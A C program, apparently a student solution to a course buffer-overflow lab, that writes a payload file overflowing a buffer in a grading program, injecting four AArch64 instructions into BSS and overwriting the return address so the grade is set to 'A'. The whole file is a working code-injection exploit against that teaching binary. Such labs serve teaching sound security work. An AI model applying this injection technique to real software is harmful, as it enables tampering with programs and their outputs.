/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Authors: Byron Zhang & Nicholas Padmanabhan                        */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "miniassembler.h"

/*
    Takes no command-line or function arguments and does not read from
    any input stream. Writes to a file stream, creating a text file
    called dataA. Returns EXIT_SUCCESS.
*/
int main(int argc, char const *argv[]) {
    const char *name = "Nick Zhang";
    const size_t BUFSIZE = 48;
    const size_t INSTR_SIZE = 16;
    FILE *psFile;
    size_t i;

    /* 0x420058 is the address of the start of BSS; ulData is the
    address of the mov instruction */
    unsigned long ulData = 0x420058 + BUFSIZE - INSTR_SIZE;

    /* mov w0, 'A' */
    unsigned int mov = MiniAssembler_mov(0, 'A');

    /* adr x1, grade */
    unsigned int adr = MiniAssembler_adr(1, 0x420044, ulData + 4);

    /* strb w0, [x1] */
    unsigned int strb = MiniAssembler_strb(0, 1);

    /* b (printf in main) */
    unsigned int b = MiniAssembler_b(0x400864, ulData + 12);

    /* Creates empty dataA text file */
    psFile = fopen("dataA", "w");

    /* Writes each char from *name into psFile */
    for (i = 0; i < strlen(name); i++) putc(name[i], psFile);

    /* Writes null bytes until there are BUFSIZE - INSTR_SIZE bytes in
       psFile to leave INSTR_SIZE bytes for the instructions */
    for (i = strlen(name); i < BUFSIZE - INSTR_SIZE; i++)
        putc(0, psFile);

    /* Writes the four injected BSS instructions */
    fwrite(&mov, sizeof(unsigned int), 1, psFile);
    fwrite(&adr, sizeof(unsigned int), 1, psFile);
    fwrite(&strb, sizeof(unsigned int), 1, psFile);
    fwrite(&b, sizeof(unsigned int), 1, psFile);

    /* Writes the address of the first injected instruction in BSS */
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);

    /* Closes the dataA text file */
    fclose(psFile);

    return EXIT_SUCCESS;
}